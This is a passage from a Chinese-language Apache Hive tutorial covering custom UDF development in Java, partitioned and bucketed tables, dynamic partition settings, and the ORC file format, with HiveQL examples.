function）</p><p><strong>根据用户自定义函数类别分为以下三种</strong></p><ul><li>UDF（User-Defined-Function）一进一出</li><li>UDAF（User-Defined Aggregation Function），用户自定义聚合函数，多进一出。类似于：count/max/min</li><li>UDTF（User-Defined Table-Generating Functions），用户自定义表生成函数，一进多出。如lateral view explode()</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 编程步骤如下</span></span><br><span class="line"><span class="comment">#（1）继承Hive提供的类</span></span><br><span class="line"><span class="comment">#org.apache.hadoop.hive.ql.udf.generic.GenericUDF</span></span><br><span class="line"><span class="comment">#org.apache.hadoop.hive.ql.udf.generic.GenericUDTF;</span></span><br><span class="line"><span class="comment">#（2）实现类中的抽象方法</span></span><br><span class="line"><span class="comment">#（3）在hive的命令行窗口创建函数</span></span><br><span class="line"><span class="comment"># 添加jar</span></span><br><span class="line">add jar linux_jar_path</span><br><span class="line"><span class="comment"># 创建function。</span></span><br><span class="line">create [temporary] <span class="keyword">function</span> [dbname.]function_name AS class_name;</span><br><span class="line"><span class="comment">#（4）在hive的命令行窗口删除函数</span></span><br><span class="line">drop [temporary] <span class="keyword">function</span> [<span class="keyword">if</span> exists] [dbname.]function_name;</span><br></pre></td></tr></table></figure><h3 id="7-2-自定义UDF函数">7.2 自定义UDF函数</h3><p><strong>需求</strong>：自定义一个UDF实现计算给定基本数据类型的长度，例如<code>select my_len(&quot;abcd&quot;);</code>首先创建一个Maven工程Hive导入依赖（自定义UDTF也是同理）</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.hive<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hive-exec<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>创建类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 我们需计算一个要给定基本数据类型的长度</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyUDF</span> <span class="keyword">extends</span> <span class="title">GenericUDF</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 判断传进来的参数的类型和长度</span></span><br><span class="line"><span class="comment">     * 约定返回的数据类型</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ObjectInspector <span class="title">initialize</span><span class="params">(ObjectInspector[] arguments)</span> <span class="keyword">throws</span> UDFArgumentException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (arguments.length !=<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span>  <span class="keyword">new</span> UDFArgumentLengthException(<span class="string">"please give me  only one arg"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!arguments[<span class="number">0</span>].getCategory().equals(ObjectInspector.Category.PRIMITIVE))&#123;</span><br><span class="line">            <span class="keyword">throw</span>  <span class="keyword">new</span> UDFArgumentTypeException(<span class="number">1</span>, <span class="string">"i need primitive type arg"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> PrimitiveObjectInspectorFactory.javaIntObjectInspector;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 解决具体逻辑的</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">evaluate</span><span class="params">(DeferredObject[] arguments)</span> <span class="keyword">throws</span> HiveException </span>&#123;</span><br><span class="line"></span><br><span class="line">        Object o = arguments[<span class="number">0</span>].get();</span><br><span class="line">        <span class="keyword">if</span>(o==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> o.toString().length();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="comment">// 用于获取解释的字符串</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getDisplayString</span><span class="params">(String[] children)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ==================创建临时函数=======================</span></span><br><span class="line"><span class="comment"># 打成jar包上传到服务器/opt/module/hive/datas/myudf.jar</span></span><br><span class="line"><span class="comment"># 将jar包添加到hive的classpath，临时生效</span></span><br><span class="line">add jar /opt/module/hive/datas/myudf.jar;</span><br><span class="line"><span class="comment"># 创建临时函数与开发好的java class关联</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">temporary</span> <span class="keyword">function</span> my_len <span class="keyword">as</span> <span class="string">"com.atguigu.hive.udf.MyUDF"</span>;</span><br><span class="line"><span class="comment"># 即可在hql中使用自定义的临时函数</span></span><br><span class="line"><span class="keyword">select</span> </span><br><span class="line">    ename,</span><br><span class="line">    my_len(ename) ename_len </span><br><span class="line"><span class="keyword">from</span> emp;</span><br><span class="line"><span class="comment"># 删除临时函数</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">temporary</span> <span class="keyword">function</span> my_len;</span><br><span class="line"><span class="comment"># 注意：临时函数只跟会话有关系，跟库没有关系。只要创建临时函数的会话不断，在当前会话下，任意一个库都可以使用，其他会话全都不能使用</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ====================创建永久函数=====================</span></span><br><span class="line"><span class="comment"># 注意：因为add jar本身也是临时生效，所以在创建永久函数的时候，需要制定路径（并且因为元数据的原因，这个路径还得是HDFS上的路径）</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> my_len2 <span class="keyword">as</span> <span class="string">"com.atguigu.hive.udf.MyUDF"</span> <span class="keyword">using</span> jar <span class="string">"hdfs://hadoop102:8020/udf/myudf.jar"</span>;</span><br><span class="line"><span class="comment"># 即可在hql中使用自定义的永久函数</span></span><br><span class="line"><span class="keyword">select</span> </span><br><span class="line">    ename,</span><br><span class="line">    my_len2(ename) ename_len </span><br><span class="line"><span class="keyword">from</span> emp;</span><br><span class="line"><span class="comment"># 删除永久函数 </span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">function</span> my_len2;</span><br><span class="line"><span class="comment"># 注意：永久函数跟会话没有关系，创建函数的会话断了以后，其他会话也可以使用。</span></span><br><span class="line"><span class="comment"># 永久函数创建的时候，在函数名之前需要自己加上库名，如果不指定库名的话，会默认把当前库的库名给加上。</span></span><br><span class="line"><span class="comment"># 永久函数使用的时候，需要在指定的库里面操作，或者在其他库里面使用的话加上，库名.函数名。</span></span><br></pre></td></tr></table></figure><h1>四、分区、分桶表和文件</h1><h2 id="1、分区表">1、分区表</h2><blockquote><p>Hive中的分区就是把一张大表的数据按照业务需要分散的存储到多个目录，每个目录就称为该表的一个分区。在查询时通过where子句中的表达式选择查询所需要的分区，这样的查询效率会提高很多</p></blockquote><h3 id="1-1-分区表基本语法">1.1 分区表基本语法</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> dept_partition</span><br><span class="line">(</span><br><span class="line">    deptno <span class="built_in">int</span>,    <span class="comment">--部门编号</span></span><br><span class="line">    dname  <span class="keyword">string</span>, <span class="comment">--部门名称</span></span><br><span class="line">    loc    <span class="keyword">string</span>  <span class="comment">--部门位置</span></span><br><span class="line">)partitioned <span class="keyword">by</span> (<span class="keyword">day</span> <span class="keyword">string</span>)</span><br><span class="line"><span class="keyword">row</span> <span class="keyword">format</span> <span class="keyword">delimited</span> <span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">'\t'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ======================= 写入数据 =================</span></span><br><span class="line"><span class="comment"># load写法</span></span><br><span class="line"><span class="comment"># 在/opt/module/hive/datas/路径上创建文件dept_20220401.log</span></span><br><span class="line">vim dept_20220401.log</span><br><span class="line">10      行政部  1700</span><br><span class="line">20      财务部  1800</span><br><span class="line"><span class="comment"># 装载语句</span></span><br><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">local</span> inpath <span class="string">'/opt/module/hive/datas/dept_20220401.log'</span> <span class="keyword">into</span> <span class="keyword">table</span> dept_partition <span class="keyword">partition</span>(<span class="keyword">day</span>=<span class="string">'20220401'</span>);</span><br><span class="line"><span class="comment"># insert写法</span></span><br><span class="line"><span class="comment"># 将day='20220401'分区的数据插入到day='20220402'分区</span></span><br><span class="line"><span class="keyword">insert</span> overwrite <span class="keyword">table</span> dept_partition <span class="keyword">partition</span> (<span class="keyword">day</span> = <span class="string">'20220402'</span>)</span><br><span class="line"><span class="keyword">select</span> deptno, dname, loc</span><br><span class="line"><span class="keyword">from</span> dept_partition</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">day</span> = <span class="string">'20220401'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ========================== 读数据========================</span></span><br><span class="line"><span class="comment"># 查询分区表数据时，可以将分区字段看作表的伪列，可像使用其他字段一样使用分区字段</span></span><br><span class="line"><span class="keyword">select</span> deptno, dname, loc ,<span class="keyword">day</span></span><br><span class="line"><span class="keyword">from</span> dept_partition</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">day</span> = <span class="string">'20220401'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ========================分区表基本操作======================</span></span><br><span class="line"><span class="comment"># 查看所有分区信息</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">partitions</span> dept_partition;</span><br><span class="line"><span class="comment"># 增加分区</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> dept_partition <span class="keyword">add</span> <span class="keyword">partition</span>(<span class="keyword">day</span>=<span class="string">'20220403'</span>);</span><br><span class="line"><span class="comment"># 同时创建多个分区（分区之间不能有逗号）</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> dept_partition <span class="keyword">add</span> <span class="keyword">partition</span>(<span class="keyword">day</span>=<span class="string">'20220404'</span>) <span class="keyword">partition</span>(<span class="keyword">day</span>=<span class="string">'20220405'</span>);</span><br><span class="line"><span class="comment"># 删除分区，单个分区</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> dept_partition <span class="keyword">drop</span> <span class="keyword">partition</span> (<span class="keyword">day</span>=<span class="string">'20220403'</span>);</span><br><span class="line"><span class="comment"># 同时删除多个分区（分区之间必须有逗号）</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> dept_partition <span class="keyword">drop</span> <span class="keyword">partition</span> (<span class="keyword">day</span>=<span class="string">'20220404'</span>), <span class="keyword">partition</span>(<span class="keyword">day</span>=<span class="string">'20220405'</span>);</span><br></pre></td></tr></table></figure><p><strong>修复分区</strong></p><p>Hive将分区表的所有分区信息都保存在了元数据中，只有元数据与HDFS上的分区路径一致时，分区表才能正常读写数据。若用户手动创建/删除分区路径，Hive都是感知不到的，这样就会导致Hive的元数据和HDFS的分区路径不一致。再比如，若分区表为外部表，用户执行drop partition命令后，分区元数据会被删除，而HDFS的分区路径不会被删除，同样会导致Hive的元数据和HDFS的分区路径不一致。</p><p>若出现元数据和HDFS路径不一致的情况，可通过如下几种手段进行修复</p><ul><li><strong>add partition</strong>，若手动创建HDFS的分区路径，Hive无法识别，可通过add partition命令增加分区元数据信息，从而使元数据和分区路径保持一致</li><li><strong>drop partition</strong>，若手动删除HDFS的分区路径，Hive无法识别，可通过drop partition命令删除分区元数据信息，从而使元数据和分区路径保持一致</li><li><strong>msck</strong>，若分区元数据和HDFS的分区路径不一致，还可使用msck命令进行修复</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msck <span class="keyword">repair</span> <span class="keyword">table</span> table_name [<span class="keyword">add</span>/<span class="keyword">drop</span>/<span class="keyword">sync</span> <span class="keyword">partitions</span>];</span><br><span class="line"><span class="comment"># msck repair table table_name add partitions：该命令会增加HDFS路径存在但元数据缺失的分区信息</span></span><br><span class="line"><span class="comment"># msck repair table table_name drop partitions：该命令会删除HDFS路径已经删除但元数据仍然存在的分区信息</span></span><br><span class="line"><span class="comment"># msck repair table table_name sync partitions：该命令会同步HDFS路径和元数据分区信息，相当于同时执行上述的两个命令</span></span><br><span class="line"><span class="comment"># msck repair table table_name：等价于msck repair table table_name add partitions命令</span></span><br></pre></td></tr></table></figure><h3 id="1-2-二级分区表">1.2 二级分区表</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如果一天内的日志数据量也很大，如何再将数据拆分?答案是二级分区表，例如可以在按天分区的基础上，再对每天的数据按小时进行分区</span></span><br><span class="line"><span class="comment"># 二级分区表建表语句</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> dept_partition2(</span><br><span class="line">    deptno <span class="built_in">int</span>,    <span class="comment">-- 部门编号</span></span><br><span class="line">    dname <span class="keyword">string</span>, <span class="comment">-- 部门名称</span></span><br><span class="line">    loc <span class="keyword">string</span>     <span class="comment">-- 部门位置</span></span><br><span class="line">)</span><br><span class="line">partitioned <span class="keyword">by</span> (<span class="keyword">day</span> <span class="keyword">string</span>, <span class="keyword">hour</span> <span class="keyword">string</span>)</span><br><span class="line"><span class="keyword">row</span> <span class="keyword">format</span> <span class="keyword">delimited</span> <span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">'\t'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据装载语句</span></span><br><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">local</span> inpath <span class="string">'/opt/module/hive/datas/dept_20220401.log'</span> </span><br><span class="line"><span class="keyword">into</span> <span class="keyword">table</span> dept_partition2 </span><br><span class="line"><span class="keyword">partition</span>(<span class="keyword">day</span>=<span class="string">'20220401'</span>, <span class="keyword">hour</span>=<span class="string">'12'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询分区数据</span></span><br><span class="line"><span class="keyword">select</span> </span><br><span class="line">    * </span><br><span class="line"><span class="keyword">from</span> dept_partition2 </span><br><span class="line"><span class="keyword">where</span> <span class="keyword">day</span>=<span class="string">'20220401'</span> <span class="keyword">and</span> <span class="keyword">hour</span>=<span class="string">'12'</span>;</span><br></pre></td></tr></table></figure><h3 id="1-3-动态分区">1.3 动态分区</h3><p>动态分区是指向分区表insert数据时，被写往的分区不由用户指定，而是由每行数据的最后一个字段的值来动态的决定。使用动态分区，可只用一个insert语句将数据写入多个分区</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 动态分区功能总开关（默认true，开启）</span></span><br><span class="line"><span class="keyword">set</span> hive.exec.dynamic.partition=<span class="literal">true</span></span><br><span class="line"><span class="comment"># 严格模式和非严格模式</span></span><br><span class="line"><span class="comment"># 动态分区的模式，默认strict（严格模式），要求必须指定至少一个分区为静态分区，nonstrict（非严格模式）允许所有的分区字段都使用动态分区</span></span><br><span class="line"><span class="keyword">set</span> hive.exec.dynamic.partition.mode=nonstrict</span><br><span class="line"><span class="comment"># 一条insert语句可同时创建的最大的分区个数，默认为1000</span></span><br><span class="line"><span class="keyword">set</span> hive.exec.max.dynamic.partitions=<span class="number">1000</span></span><br><span class="line"><span class="comment"># 单个Mapper或者Reducer可同时创建的最大的分区个数，默认为100</span></span><br><span class="line"><span class="keyword">set</span> hive.exec.max.dynamic.partitions.pernode=<span class="number">100</span></span><br><span class="line"><span class="comment"># 一条insert语句可以创建的最大的文件个数，默认100000</span></span><br><span class="line">hive.exec.max.created.files=<span class="number">100000</span></span><br><span class="line"><span class="comment"># 当查询结果为空时且进行动态分区时，是否抛出异常，默认false</span></span><br><span class="line">hive.error.on.empty.partition=<span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ========================案例======================</span></span><br><span class="line"><span class="comment"># 需求：将dept表中的数据按照地区（loc字段），插入到目标表dept_partition_dynamic的相应分区中</span></span><br><span class="line"><span class="comment"># 创建目标分区表</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> dept_partition_dynamic(</span><br><span class="line">    <span class="keyword">id</span> <span class="built_in">int</span>, </span><br><span class="line">    <span class="keyword">name</span> <span class="keyword">string</span></span><br><span class="line">) </span><br><span class="line">partitioned <span class="keyword">by</span> (loc <span class="built_in">int</span>) </span><br><span class="line"><span class="keyword">row</span> <span class="keyword">format</span> <span class="keyword">delimited</span> <span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">'\t'</span>;</span><br><span class="line"><span class="comment"># 设置动态分区</span></span><br><span class="line"><span class="keyword">set</span> hive.exec.dynamic.partition.mode = nonstrict;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">table</span> dept_partition_dynamic </span><br><span class="line"><span class="keyword">partition</span>(loc) </span><br><span class="line"><span class="keyword">select</span> </span><br><span class="line">    deptno, </span><br><span class="line">    dname, </span><br><span class="line">    loc </span><br><span class="line"><span class="keyword">from</span> dept;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看目标分区表的分区情况</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">partitions</span> dept_partition_dynamic;</span><br></pre></td></tr></table></figure><h2 id="2、分桶表">2、分桶表</h2><h3 id="2-1-概述">2.1 概述</h3><p>分区提供一个隔离数据和优化查询的便利方式。不过，并非所有的数据集都可形成合理的分区。对于一张表或者分区，Hive 可以进一步组织成桶，也就是更为细粒度的数据范围划分，分区针对的是数据的存储路径，分桶针对的是数据文件。</p><p>分桶表的基本原理是，首先为每行数据计算一个指定字段的数据的hash值，然后模以一个指定的分桶数，最后将取模运算结果相同的行，写入同一个文件中，这个文件就称为一个分桶（bucket）</p><h3 id="2-2-分桶表基本语法">2.2 分桶表基本语法</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 建表语句</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> stu_buck(</span><br><span class="line">    <span class="keyword">id</span> <span class="built_in">int</span>, </span><br><span class="line">    <span class="keyword">name</span> <span class="keyword">string</span></span><br><span class="line">)</span><br><span class="line">clustered <span class="keyword">by</span>(<span class="keyword">id</span>) </span><br><span class="line"><span class="keyword">into</span> <span class="number">4</span> buckets</span><br><span class="line"><span class="keyword">row</span> <span class="keyword">format</span> <span class="keyword">delimited</span> <span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">'\t'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据装载</span></span><br><span class="line"><span class="comment"># 在/opt/module/hive/datas/路径上创建student.txt文件</span></span><br><span class="line"><span class="comment"># 说明：Hive新版本load数据可以直接跑MapReduce，老版的Hive需要将数据传到一张表里，再通过查询的方式导入到分桶表里面</span></span><br><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">local</span> inpath <span class="string">'/opt/module/hive/datas/student.txt'</span> <span class="keyword">into</span> <span class="keyword">table</span> stu_buck;</span><br><span class="line"><span class="comment"># 查看创建的分桶表中是否分成4个桶,即hdfs生成四个文件</span></span><br></pre></td></tr></table></figure><h3 id="2-3-分桶排序表">2.3 分桶排序表</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 排序是指在分桶的基础上，对每个桶中的数据按照某一列或多列进行排序。排序可以优化查询性能，因为查询可以通过更有效地利用数据的有序性来加速执行。排序可以在创建表格时进行定义，指定排序的列和排序顺序</span></span><br><span class="line"><span class="comment"># 建表语句</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> stu_buck_sort(</span><br><span class="line">    <span class="keyword">id</span> <span class="built_in">int</span>, </span><br><span class="line">    <span class="keyword">name</span> <span class="keyword">string</span></span><br><span class="line">)</span><br><span class="line">clustered <span class="keyword">by</span>(<span class="keyword">id</span>) sorted <span class="keyword">by</span>(<span class="keyword">id</span>)</span><br><span class="line"><span class="keyword">into</span> <span class="number">4</span> buckets</span><br><span class="line"><span class="keyword">row</span> <span class="keyword">format</span> <span class="keyword">delimited</span> <span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">'\t'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">local</span> inpath <span class="string">'/opt/module/hive/datas/student.txt'</span> <span class="keyword">into</span> <span class="keyword">table</span> stu_buck_sort;</span><br></pre></td></tr></table></figure><h2 id="3、Hive文件格式">3、Hive文件格式</h2><blockquote><p>为Hive表中的数据选择一个合适的文件格式，对提高查询性能的提高是十分有益的。Hive表数据的存储格式，可以选择text file、orc、parquet、sequence file等</p></blockquote><h3 id="3-1-Text-File">3.1 Text File</h3><p>文本文件是Hive默认使用的文件格式，文本文件中的一行内容，就对应Hive表中的一行记录。可通过以下建表语句指定文件格式为文本文件:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> textfile_table(column_specs) <span class="keyword">stored</span> <span class="keyword">as</span> textfile;</span><br></pre></td></tr></table></figure><h3 id="3-2-ORC">3.2 ORC</h3><p>ORC（Optimized Row Columnar）file format是Hive 0.11版里引入的一种<strong>列式存储</strong>的文件格式。ORC文件能够提高Hive读写数据和处理数据的性能。与列式存储相对的是行式存</p><p><img src="http://qnypic.shawncoding.top/blog/202401251334399.png" alt></p><ul><li><p><strong>行存储的特点</strong></p><p>查询满足条件的一整行数据的时候，列存储则需要去每个聚集的字段找到对应的每个列的值，行存储只需要找到其中一个值，其余的值都在相邻地方，所以此时行存储查询的速度更快。</p></li><li><p><strong>列存储的特点</strong></p><p>因为每个字段的数据聚集存储，在查询只需要少数几个字段的时候，能大大减少读取的数据量；每个字段的数据类型一定是相同的，列式存储可以针对性的设计更好的设计压缩算法</p></li></ul><p>前文提到的<strong>text file和sequence file都是基于行存储的，orc和parquet是基于列式存储</strong>的。orc文件的具体结构如下图所示</p><p><img src="http://qnypic.shawncoding.top/blog/202401251334400.png" alt></p><p>每个ORC文件由Header、Body和Tail三部分组成，<strong>其中Header内容为ORC，用于表示文件类型</strong>。Body由1个或多个stripe组成，每个stripe一般为HDFS的块大小，每一个stripe包含多条记录，这些记录按照列进行独立存储，每个stripe里有三部分组成，分别是<code>Index Data，Row Data，Stripe Footer</code>。</p><ul><li>**Index Data：**一个轻量级的index，默认是为各列每隔1W行做一个索引。每个索引会记录第n万行的位置，和最近一万行的最大值和最小值等信息</li><li>**Row Data：**存的是具体的数据，按列进行存储，并对每个列进行编码，分成多个Stream来存储</li><li>**Stripe Footer：**存放的是各个Stream的位置以及各column的编码信息</li></ul><p><strong>Tail由File Footer和PostScript组成</strong>。File Footer中保存了各Stripe的其实位置、索引长度、数据长度等信息，各Column的统计信息等；PostScript记录了整个文件的压缩类型以及File Footer的长度信息等。</p><p><strong>在读取ORC文件时，会先从最后一个字节读取PostScript长度，进而读取到PostScript，从里面解析到File Footer长度，进而读取FileFooter，从中解析到各个Stripe信息，再读各个Stripe，即从后往前读</strong>。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 建表语句</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> orc_table</span><br><span class="line">(column_specs)</span><br><span class="line"><span class="keyword">stored</span> <span class="keyword">as</span> orc</span><br><span class="line">tblproperties (property_name=property_value, ...);</span><br><span class="line"><span class="comment"># 